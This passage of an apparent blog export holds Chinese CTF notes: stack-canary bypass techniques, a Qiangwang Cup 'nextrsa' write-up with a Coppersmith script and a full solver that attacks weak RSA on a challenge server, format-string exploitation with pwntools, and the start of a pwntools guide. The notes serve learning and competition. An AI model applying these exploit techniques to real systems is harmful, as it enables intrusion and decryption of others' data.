884c\u4e0b\u4e00\u6b21\u6269\u5c55\u3002\u5728\u89e3\u7b54\u6811\u4e0a\u53d8\u73b0\u4e3a\u6309\u5c42\u6b21\u904d\u5386\u6240\u6709\u72b6\u6001\n3.\u6709\u6548\u72b6\u6001\u3002\u5bf9\u6709\u4e9b\u72b6\u6001\u6211\u4eec\u5e76\u4e0d\u5bf9\u5176\u8fdb\u884c\u518d\u4e00\u6b21\u6269\u5c55\uff0c\u800c\u662f\u76f4\u63a5\u820d\u5f03\u5b83\u3002\u56e0\u4e3a\u6839\u636e\u95ee\u9898\u5206\u6790\u53ef\u77e5\uff0c\u76ee\u6807\u72b6\u6001\u4e0d\u4f1a\u7531\u8fd9\u4e9b\u72b6\u6001\u7ecf\u8fc7\u82e5\u5e72\u6b21\u6269\u5c55\u5f97\u5230\uff0c\u5373\u76ee\u6807\u72b6\u6001\u4e0d\u53ef\u80fd\u5b58\u5728\u5176\u5728\u89e3\u7b54\u6811\u4e0a\u7684\u5b50\u6811\u4e0a\uff0c\u6240\u4ee5\u76f4\u63a5\u820d\u5f03\n4.\u961f\u5217\u3002\u4e3a\u4e86\u5b9e\u73b0\u5148\u5f97\u51fa\u7684\u72b6\u6001\u5148\u8fdb\u884c\u6269\u5c55\uff0c\u6211\u4eec\u4f7f\u7528\u961f\u5217\uff0c\u5c06\u5f97\u5230\u7684\u72b6\u6001\u4f9d\u6b21\u653e\u5165\u961f\u5c3e\uff0c\u6bcf\u6b21\u53d6\u961f\u5934\u5143\u7d20\u8fdb\u884c\u6269\u5c55\n5.\u6807\u8bb0\u3002\u4e3a\u4e86\u5224\u65ad\u54ea\u4e9b\u72b6\u6001\u662f\u6709\u6548\u7684\uff0c\u54ea\u4e9b\u662f\u65e0\u6548\u7684\uff0c\u6211\u4eec\u5f80\u5f80\u4f7f\u7528\u6807\u8bb0\n6.\u6709\u6548\u72b6\u6001\u6570\u3002\u95ee\u9898\u4e2d\u7684\u6709\u6548\u72b6\u6001\u6570\u4e0e\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u540c\u6570\u91cf\u7ea7\uff0c\u6240\u4ee5\u5728\u8fdb\u884c\u641c\u7d22\u4e4b\u524d\u5fc5\u987b\u4f30\u7b97\u5176\u662f\u5426\u5728\u6211\u4eec\u53ef\u4ee5\u63a5\u53d7\u7684\u8303\u56f4\u5185\n7.\u6700\u4f18\u3002\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u5e38\u88ab\u7528\u6765\u89e3\u51b3\u6700\u4f18\u503c\u95ee\u9898\uff0c\u56e0\u4e3a\u5176\u641c\u7d22\u5230\u7684\u72b6\u6001\u603b\u662f\u6309\u7167\u67d0\u4e2a\u5173\u952e\u5b57\u9012\u589e\uff0c\u8fd9\u4e2a\u7279\u6027\u975e\u5e38\u9002\u5408\u6c42\u89e3\u6700\u4f18\u503c\u95ee\u9898\n\n\n\n", "categories": [{"name": "ACM", "slug": "ACM", "permalink": "/category/ACM/"}], "tags": [{"name": "ACM", "slug": "ACM", "permalink": "/tag/ACM/"}, {"name": "ppc", "slug": "ppc", "permalink": "/tag/ppc/"}, {"name": "c++", "slug": "c++", "permalink": "/tag/c++/"}]}, {"title": "canary\u7b14\u8bb0", "date": "2018-03-30T13:57:11-00.00", "path": "/archives/CanaryNote/", "text": "canary\u7b14\u8bb0\n\u5e03\u5c40\ncanary\u5e03\u5c40\nmore\n\u76f4\u63a5\u6cc4\u6f0f\n\u56e0\u4e3acanary\u6700\u4f4e\u5b57\u8282\u5fc5\u662f'\\x00'(\u9632\u6b62\u586b\u6ee1\u628a\u5b83\u6253\u5370\u51fa\u6765)\uff0c\u5219\u6ee1\u8db3\u4e0b\u9762\u6761\u4ef6\uff1a\n\n\n\u7f13\u51b2\u533a\u6ea2\u51fa\u53ef\u4ee5\u586b\u5145\u5230\u4e14\u53ea\u586b\u5145\u5230canary\u6700\u4f4e\u5b57\u8282\n\u7a0b\u5e8f\u53ef\u4ee5\u8f93\u51fa\u586b\u5145\u7684\u5185\u5bb9\n\u51fd\u6570\u8fd4\u56de\u524d\u8fd8\u6709\u518d\u6b21\u586b\u5145\u673a\u4f1a\n\n\n\u586b\u5145\u5230canary\u6700\u4f4e\u5b57\u8282\n\u8fd9\u6837\u5c31\u53ef\u4ee5\u8bfb\u51facanary\u540e\u518d\u628a\u5b83\u52a0\u5230payload\u4e0a\uff0c\u4ece\u800c\u7ed5\u8fc7canary\u3002\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u7279\u6027\uff0c\u53ef\u4ee5\u8bfb\u51facanary\u6216\u4fee\u6539cannary\u6267\u884c___stack_chk_fail()\uff0c\u5177\u4f53\u7528\u6cd5\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7b14\u8bb0\u3002\n\u7206\u7834\n\u82e5\u7a0b\u5e8f\u6709fork()\u4f7f\u5b50\u7a0b\u5e8f\u5faa\u73af\u6267\u884c\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b50\u7a0b\u5e8f\u6808\u4e0e\u4e3b\u7a0b\u5e8f\u4e00\u81f4\u6162\u6162\u7206\u7834\u3002\nssp leak\n\u56e0\u4e3a\u51fd\u6570\u8fd4\u56de\u524d\u4f1a\u68c0\u67e5canary\uff0c\u82e5\u4e0d\u901a\u8fc7\u4f1a\u8df3\u8f6c\u5230___stack_chk_fail()\uff1a\n___stack_chk_fail()\n\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539___stack_chk_fail()\u5730\u5740\u548c\u8986\u76d6canary\u6765\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u4f46\u8fd9\u91cc\u4e5f\u6709\u4e00\u79cd\u53ef\u4ee5\u5229\u7528\u7684\u4e1c\u897f\uff1a\n\u770b\u4e00\u4e0b\u6e90\u7801\uff1a\n__stack_chk_fail:\nvoid \n__attribute__ ((noreturn)) \n__stack_chk_fail (void) {   \n    __fortify_fail (&quot;stack smashing detected&quot;); \n}\n\nfortify_fail:\nvoid \n__attribute__ ((noreturn)) \n__fortify_fail (msg)\n   const char *msg; {\n      /* The loop is added only to keep gcc happy. */\n         while (1)\n              __libc_message (2, &quot;*** %s ***: %s terminated\\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) \n} \nlibc_hidden_def (__fortify_fail)\n\n__libc_message \u7684\u7b2c\u4e8c\u4e2a%s\u8f93\u51fa\u7684\u662fargv[0]\uff0cargv[0]\u662f\u6307\u5411\u7b2c\u4e00\u4e2a\u542f\u52a8\u53c2\u6570\u5b57\u7b26\u4e32\u7684\u6307\u9488,\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7f13\u51b2\u533a\u6ea2\u51fa\u8986\u76d6\u6389argv[0]\u6253\u5370\u6211\u4eec\u60f3\u8981\u7684\u5730\u5740\u4e0a\u7684\u503c\u3002\n", "categories": [{"name": "pwn", "slug": "pwn", "permalink": "/category/pwn/"}], "tags": [{"name": "pwn", "slug": "pwn", "permalink": "/tag/pwn/"}, {"name": "canary", "slug": "canary", "permalink": "/tag/canary/"}]}, {"title": "\u7b2c\u4e8c\u5c4a\u5f3a\u7f51\u676fnextrsa", "date": "2018-03-30T13:57:11-00.00", "path": "/archives/nextrsa/", "text": "nextrsa\n\n\u7b2c\u4e00\u5173\n\u7b2c\u4e00\u5173\n\u56e0\u4e3an\u7684\u4f4d\u6570\u8f83\u4f4e\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528factor.db\u5206\u89e3\n\n\u7b2c\u4e8c\u5173\n\u7b2c\u4e8c\u5173\n\u53ef\u4ee5\u53d1\u73b0e\u548cn\u76f8\u5dee\u65e0\u51e0\uff0c\u5219d\u5c31\u5e94\u5f53\u5f88\u5c0f\uff0c\u9002\u5408Wiener's Attack\u653b\u51fb\n\n\u7b2c\u4e09\u5173\n\u7b2c\u4e09\u5173\nCoppersmith\u6709\u4e00\u4e2a\u76f8\u5173\u5df2\u77e5\u660e\u6587\u9ad8\u4f4d\u7684\u5957\u8def\uff0c\u6839\u636e\u5176\u5957\u8def\u53ef\u4ee5\u5199\u811a\u672c\u8dd1\u51fax:\nfrom sage.all import *\nimport binascii\n\ndef coppersmith_howgrave_univariate(pol, modulus, beta, mm, tt, XX):\n    &quot;&quot;&quot;\n    Coppersmith revisited by Howgrave-Graham\n\n    finds a solution if:\n    * b|modulus, b &gt;= modulus^beta , 0 &lt; beta &lt;= 1\n    * |x| &lt; XX\n    &quot;&quot;&quot;\n    #\n    # init\n    #\n    dd = pol.degree()\n    nn = dd * mm + tt\n\n    #\n    # checks\n    #\n    if not 0 &lt; beta &lt;= 1:\n        raise ValueError(&quot;beta should belongs in (0, 1]&quot;)\n\n    if not pol.is_monic():\n        raise ArithmeticError(&quot;Polynomial must be monic.&quot;)\n\n    #\n    # calculate bounds and display them\n    #\n    &quot;&quot;&quot;\n    * we want to find g(x) such that ||g(xX)|| &lt;= b^m / sqrt(n)\n    * we know LLL will give us a short vector v such that:\n    ||v|| &lt;= 2^((n - 1)/4) * det(L)^(1/n)\n    * we will use that vector as a coefficient vector for our g(x)\n\n    * so we want to satisfy:\n    2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)\n\n    so we can obtain ||v|| &lt; N^(beta*m) / sqrt(n) &lt;= b^m / sqrt(n)\n    (it&#39;s important to use N because we might not know b)\n    &quot;&quot;&quot;\n\n\n    #\n    # Coppersmith revisited algo for univariate\n    #\n\n    # change ring of pol and x\n    polZ = pol.change_ring(ZZ)\n    x = polZ.parent().gen()\n\n    # compute polynomials\n    gg = []\n    for ii in range(mm):\n        for jj in range(dd):\n            gg.append((x * XX)**jj * modulus**(mm - ii) * polZ(x * XX)**ii)\n    for ii in range(tt):\n        gg.append((x * XX)**ii * polZ(x * XX)**mm)\n\n    # construct lattice B\n    BB = Matrix(ZZ, nn)\n\n    for ii in range(nn):\n        for jj in range(ii+1):\n            BB[ii, jj] = gg[ii][jj]\n\n\n    # LLL\n    BB = BB.LLL()\n\n    # transform shortest vector in polynomial    \n    new_pol = 0\n    for ii in range(nn):\n        new_pol += x**ii * BB[0, ii] / XX**ii\n\n    # factor polynomial\n    potential_roots = new_pol.roots()\n    print &quot;potential roots:&quot;, potential_roots\n\n    # test roots\n    roots = []\n    for root in potential_roots:\n        if root[0].is_integer():\n            result = polZ(ZZ(root[0]))\n            if gcd(modulus, result) &gt;= modulus^beta:\n                roots.append(ZZ(root[0]))\n\n    # \n    return roots\n\nlength_N = 512\nKbits = 64\nN = 85386486679828599580613066311269711214589585481101615581296927592958807231446970184482261388474676486050444822516280749509523758510668655773404480913269316295175308996609608070541200210554579418533451998222898737697148663794221042817919855879902993658181608937735268591691305164506461133402548866059191941933L\ne = 3\nC = 39405977400432024095329579138777905592731613749623714143014800208080426514337386767953501370330051575213583063517497523787104967672473851683888736374797826583547420259646720505700192827892104650587073833929922367521346003590720815367916103365434959190063774892078125987148203790224964513136099494214652877100L\nb = 0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n\nP.&lt;x&gt; = PolynomialRing(Zmod(N))\n\nf = (b + x)^e - C\ndd = f.degree()\nbeta = 1\nepsilon = beta / 7\nmm = ceil(beta**2 / (dd * epsilon))\ntt = floor(dd * mm * ((1/beta) - 1))\nXX = ceil(N**((beta**2/dd) - epsilon))\nroots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX)\nprint &quot;\\n# Solutions&quot;\nprint &quot;we found:&quot;, str(roots)\n\n\n\u7b2c\u56db\u5173\n\u7b2c\u56db\u5173\n\u7b2c\u56db\u5173\n\n\u7b2c\u4e94\u5173\n\u7b2c\u4e94\u5173\n\u628an\u5c1d\u8bd5\u5206\u89e3\u53ef\u77e5n\u542b\u6709\u4e00\u4e2a\u5c0f\u56e0\u6570\uff0c\u4f46\u662f\u8fd9\u4e2an\u662f\u9694\u4e00\u6bb5\u65f6\u95f4\uff08\u4e0d\u662f\u6bcf\u4e00\u6b21\uff09\u4f1a\u53d8\u7684\uff0c\u4e0d\u8fc7\u542b\u5c0f\u56e0\u6570\u7684\u6027\u8d28\u4e0d\u53d8\uff0c\u6240\u4ee5\u6bcf\u6b21\u5230\u8fd9\u91cc\u5148\u5206\u89e3\u5427\n\n\u7b2c\u516d\u5173\n\u7b2c\u516d\u5173\n\u53ef\u4ee5\u76f4\u63a5\u770b\u5230e=0x3\u5f88\u5c0f\uff0c\u4f30\u8ba1\u5c31\u662f\u7206\u7834c+i*n\u4e2d\u7684i\u4f7f\u5176\u80fd\u88abe\u5f00\u6839\uff0c\u4e8b\u5b9e\u8bc1\u660e\u786e\u5b9e\u5927\u6982\u51e0\u4e07\u5c31\u51fa\u6765\u4e86\n\n\u7b2c\u4e03\u5173\n\u7b2c\u4e03\u5173\n\u5149\u770b\u4e0a\u53bb\u662f\u6ca1\u4ec0\u4e48\u601d\u8def\uff0c\u4f46\u6c42gcd(n1,n2)\u4e0d\u7b49\u4e8e1\uff0c\u5219\u53ef\u76f4\u63a5\u5206\u89e3\u8fd9\u4e24\u4e2an\n\n\u7b2c\u516b\u5173\n\u7b2c\u516b\u5173\n\u633a\u660e\u663e\u7684\u5171\u6a21\u653b\u51fb\n\n\u7b2c\u4e5d\u5173\n\u7b2c\u4e5d\u5173\n\u4e5f\u662f\u5f88\u660e\u663e\u7684\u5e7f\u64ad\u653b\u51fb\uff0ce\u5f88\u5c0f\u4e14\u660e\u6587\u76f8\u540c\uff0c\u8bdd\u8bf4\u8d8a\u5230\u540e\u9762\u8d8a\u7b80\u5355\u4e48\n\n\u811a\u672c\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\nfrom mylib import *\nimport hashlib\nimport gmpy\n\n#context.log_level = &quot;debug&quot;\n\ndef before():\n    token = &quot;icq850a27bc1dc210c9e10cc8d1ed28f&quot;\n    r = remote(&#39;39.107.33.90&#39;,9999)\n    r.sendline(token)\n    r.recvuntil(&#39;\\&#39;&#39;)\n    value = r.recv(8)\n    r.recvuntil(&#39;=&#39;)\n    for a in xrange(0xff):\n            for b in xrange(0xff):\n                    for c in xrange(0x1f):\n                            hashv = chr(a) + chr(b) + chr(c)\n                            if(hashlib.sha256(hashv).hexdigest()[0:8] == value):\n                                    r.sendline(hashv.encode(&#39;hex&#39;))\n                                    return r\n\ndef solve(r):\n    &quot;&quot;&quot;\n    \u4f4d\u6570\u5c11,\u53ef\u76f4\u63a5\u5206\u89e3\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;c=&#39;)\n    c = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    e = 0x10001\n    p = 289540461376837531747468286266019261659\n    q = 306774653454153140532319815768090345109\n    n = p * q\n    ph = (p - 1) * (q - 1)\n    d = gmpy.invert(e, ph)\n    m = QuickPower(c, d, n)\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    Wiener&#39;s Attack\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;n=&#39;)\n    n = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;e=&#39;)\n    e = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c=&#39;)\n    c = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    d = hack_RSA(e,n)\n    m = QuickPower(c, d, n)\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    Coppersmith\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;m&#39;)    #10000 wrong\n    x = 3704324190009897835\n    r.sendline(hex(x).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    nextprime()\u6027\u8d28\u6784\u9020\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u6c42\u6839\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;c=&#39;)\n    c = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    e = 0x10001\n    q = 114791494681514143990268371423282183138226784645868909558224024738011633713833580549522009721245299751435183564384247261418984397745114977301564583085777881485180217075670585703780063072373569054286277474670485124459902688373648390826470893613150198411843162021692225644621249349903453125961550887837378298881\n    p = 132940802289018336261987415312533953042764596984032548157327529495089307889127354914528507277209940457450746338751400025568015673025956762534143027257695791611900765053802453566263676389771478041671317414828940200119172760057249923066534954345956113954028278683477795444749575874548525999126508093286460575953\n    n = q * p\n    ph = (p - 1) * (q - 1)\n    d = gmpy.invert(e, ph)\n    m = QuickPower(c, d, n)\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    n\u542b\u6709\u5c0f\u56e0\u6570,\u8fc7\u6bb5\u65f6\u95f4\u4f1a\u6539\u53d8n\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;c=&#39;)\n    c = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    e = 0x10001\n    q = 1827078707\n    p = 120393827811847730665892922601047874074897457839754965824187553709286586875999984122668238470178081377988439748992735957987417809407665405412580451688753139556272709693049760814986485709769800614157806922562929660004878835280427602632657375319022388348710785821982994403660254841027504457789884082670526620753\n    n = p * q\n    ph = (p - 1) * (q - 1)\n    d = gmpy.invert(e, ph)\n    m = QuickPower(c, d, n)\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    e\u4e3a\u5c0f\u6307\u6570\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;n=&#39;)\n    n = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c=&#39;)\n    c = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    e = 0x3\n    for i in xrange(1000000):\n        mm = gmpy.root(c+i*n, e)\n        if(mm[1] == 1):\n        r.sendline(hex(mm[0]).replace(&quot;L&quot;,&quot;&quot;))\n        break\n    &quot;&quot;&quot;\n    \u4e24\u4e2an\u4e0d\u4e92\u7d20\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;n1=&#39;)\n    n1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c1=&#39;)\n    c1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;n2=&#39;)\n    n2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c2=&#39;)\n    c2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    e1 = e2 = 0x10001\n    p1 = gmpy.gcd(n1,n2)\n    q1 = n1 / p1\n    ph1 = (p1 - 1) * (q1 - 1)\n    d1 = gmpy.invert(e1, ph1)\n    m1 = QuickPower(c1, d1, n1)\n    r.sendline(hex(m1).replace(&quot;L&quot;,&quot;&quot;))\n    r.recv(10000)\n    q2 = n2 / p1\n    ph2 = (p1 - 1) * (q2 - 1)\n    d2 = gmpy.invert(e2, ph2)\n    m = QuickPower(c2, d2, n2)\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    \u5171\u6a21\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;n=&#39;)\n    n = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;e1=&#39;)\n    e1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c1=&#39;)\n    c1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;e2=&#39;)\n    e2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c2=&#39;)\n    c2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    gcd,s,t = gmpy.gcdext(e1,e2)\n    if s &lt; 0:\n        s = -s\n        c1 = gmpy.invert(c1, n)\n    if t &lt; 0:\n        t = -t\n        c2 = gmpy.invert(c2, n)\n    m = (QuickPower(c1, s, n) * QuickPower(c2, t, n)) % n\n    r.sendline(hex(m).replace(&quot;L&quot;,&quot;&quot;))\n    &quot;&quot;&quot;\n    \u5e7f\u64ad\u653b\u51fb\n    &quot;&quot;&quot;\n    r.recvuntil(&#39;e=&#39;)\n    e = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;n1=&#39;)\n    n1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c1=&#39;)\n    c1 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;n2=&#39;)\n    n2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c2=&#39;)\n    c2 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;n3=&#39;)\n    n3 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recvuntil(&#39;c3=&#39;)\n    c3 = int(r.recvuntil(&#39;\\n&#39;).replace(&quot;\\n&quot;,&quot;&quot;),16)\n    r.recv(10000)\n    m = chinese_remainder_theorem([(c1,n1),(c2,n2),(c3,n3)])\n    r.sendline(hex(gmpy.root(m, e)[0]).replace(&quot;L&quot;,&quot;&quot;))\n    print r.recvuntil(&quot;}&quot;)\n\nif __name__ == &quot;__main__&quot;:\n    r = before()\n    solve(r)\n\n\nflag\nflag\n", "categories": [{"name": "crypto", "slug": "crypto", "permalink": "/category/crypto/"}], "tags": [{"name": "crypto", "slug": "crypto", "permalink": "/tag/crypto/"}, {"name": "rsa", "slug": "rsa", "permalink": "/tag/rsa/"}]}, {"title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7b14\u8bb0", "date": "2018-03-30T13:57:11-00.00", "path": "/archives/fmtNote/", "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7b14\u8bb0\n\u57fa\u672c\u683c\u5f0f\n%[parameter][flags][field width][.precision][length]type\n\nparameter :\nn$\uff0c\u83b7\u53d6\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u7b2cn\u4e2a\u53c2\u6570\n\n\nlength : \u8f93\u51fa\u7684\u957f\u5ea6\n$hhn\uff0c\u5199\u5165\u4e00\u4e2a\u5b57\u8282\n$hn\uff0c\u5199\u5165\u4e24\u4e2a\u5b57\u8282\n$n\uff0c\u200b\u5199\u5165\u56db\u4e2a\u5b57\u8282\n$lln\uff0c\u5199\u5165\u516b\u4e2a\u5b57\u8282\n\n\n\n\u7c7b\u578b\n\n\n\n  \u53c2\u6570\n  \u8f93\u5165\u7c7b\u578b\n  \u8f93\u51fa\u7c7b\u578b\n\n\n\n\n  %c\n  \u503c\n  \u5b57\u7b26\uff0c\u901a\u5e38\u7528\u6765\u914d\u5408%n\u5199\n\n\n  %d\n  \u503c\n  \u5341\u8fdb\u5236\u6574\u6570\n\n\n  %x\n  \u503c\n  \u5341\u516d\u8fdb\u5236\u6574\u6570\n\n\n  %p\n  \u503c\n  \u5341\u516d\u8fdb\u5236\u6574\u6570\uff0c\u4e0e%x\u57fa\u672c\u4e00\u6837\uff0c\u53ea\u662f\u9644\u52a0\u4e86\u524d\u7f000x\uff0c\u53ef\u7528\u6765\u5224\u65ad\u76ee\u6807\u73af\u5883\u662f32bit\u8fd8\u662f64bit\n\n\n  %s\n  \u6307\u9488\n  \u5b57\u7b26\u4e32\uff0c\u7ecf\u5e38\u7528\u6765\u8bfbGOT\u8868\u5185\u5bb9\uff0c\u9047'\\x00'\u622a\u65ad\n\n\n  %n\n  \u6307\u9488\n  \u5199\u5165\u5df2\u7ecf\u8f93\u51fa\u5b57\u8282\u4e2a\u6570\n\n\n\nmore\n\u57fa\u7840\n\n%n$x\u53ef\u4ee5\u83b7\u53d6\u5230\u5bf9\u5e94\u7684\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u6570\u503c\n\u5229\u7528%x\u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528%p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\n\u5229\u7528%s\u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\n\u5229\u7528%order$x\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528%order$s\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\n\n\u8e29\u5751\n\n\u5229\u7528\u4efb\u610f\u5199\u5efa\u8bae\u4e0d\u8981\u4e00\u6b21\u6027\u5199\u5b8c\uff0c\u53ef\u4ee5\u5206\u5b57\u8282\u5199\n\u9047\u5230\u8fc7\u6ee4$h\u548c$n,\u53ef\u4ee5\u7528$+hn,\u7b49\u540c\u4e8e$hn\n\n64\u4f4d\u524d\u516d\u4e2a\u53c2\u6570\u95ee\u9898\n\n%1$lx: RSI\n%2$lx: RDX\n%3$lx: RCX\n%4$lx: R8\n%5$lx: R9\n%6$lx: \u6808\u4e0a\u7684\u7b2c\u4e00\u4e2aQWORD\n\nFmtStr\n\u81ea\u52a8\u67e5\u627e\u504f\u79fb\u5730\u5740\uff1a\n#! /usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\n\ndef exec_fmt(payload):\n    p = process(&#39;a.out&#39;)     #\u6587\u4ef6\u8def\u5f84\n    p.sendline(payload)\n    info = p.recv()\n    p.close()\n    return info\n\nautofmt = FmtStr(exec_fmt)\nprint autofmt.offset\n\nfmtstr\n\u4ea7\u751f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5de5\u5177\uff1a\npayload = fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')\n\noffset (int) \u2013 \u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u504f\u79fb\nwrites (dict) \u2013 \u5b57\u5178\uff0c\u5411\u54ea\u4e2a\u5730\u5740\u5199\u5165\u4ec0\u4e48\u503c {addr: value, addr2: value2}\nnumbwritten (int) \u2013 \u8f93\u51fa\u5b57\u7b26\u4e32\u5df2\u7ecf\u5199\u5165\u5b57\u8282\u6570\nwrite_size (str) \u2013 byte, short or int.\u5373\u6bcf\u6b21\u5199\u4e00\u4e2a\u5b57\u8282\u3001\u4e24\u4e2a\u5b57\u8282\u8fd8\u662f\u56db\u4e2a\u5b57\u8282,\u9ed8\u8ba4\u6309\u5b57\u8282\n\nfmtarg\npwngdb\u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\ngef\u27a4  fmtarg 0x00007fffffffdb28\nThe index of format argument : 10\n\n", "categories": [{"name": "pwn", "slug": "pwn", "permalink": "/category/pwn/"}], "tags": [{"name": "pwn", "slug": "pwn", "permalink": "/tag/pwn/"}, {"name": "fmt", "slug": "fmt", "permalink": "/tag/fmt/"}]}, {"title": "pwntools\u4f7f\u7528", "date": "2018-03-28T17:00:36-00.00", "path": "/archives/pwntools/", "text": "pwntools\u4f7f\u7528\n\u5b89\u88c5\n$ apt-get update\n$ apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential\n$ pip install --upgrade pip\n$ pip install --upgrade pwntools\n\n\u5982\u679c\u60f3\u8981\u5728\u672c\u5730\u6d4b\u8bd5,\u53ef\u4ee5\u8fd9\u4e48\u505a\uff1a\n$ git clone https://github.com/Gallopsled/pwntools\n$ pip install --upgrade --editable ./pwntools\n\n\u4f7f\u7528\u65f6\u8fd9\u6837\u5bfc\u5165\uff1a\nfrom pwn import *\n\n\n\u8fde\u63a5\nr = = process(&#39;/bin/sh&#39;) #\u672c\u5730\u6587\u4ef6\nr = remote(&#39;ftp.ubuntu.org&#39;,21) #\u8fdc\u7a0b\uff0chostname + port\n\nr.send(data)    #\u53d1\u9001\u6570\u636e\nr.sendline(data)    #\u53d1\u9001\u6570\u636e + &#39;\\n&#39;\n\nr.recv(numb=4096,timeout=default)   #\u63a5\u53d7\u6307\u5b9a\u5b57\u8282\u6570\u636e,timeout\u6307\u5b9a\u8d85\u65f6\nr.recvuntil(delims, drop=False) #\u63a5\u6536\u5230delims\u7684pattern\nr.recvline(keepends=True)   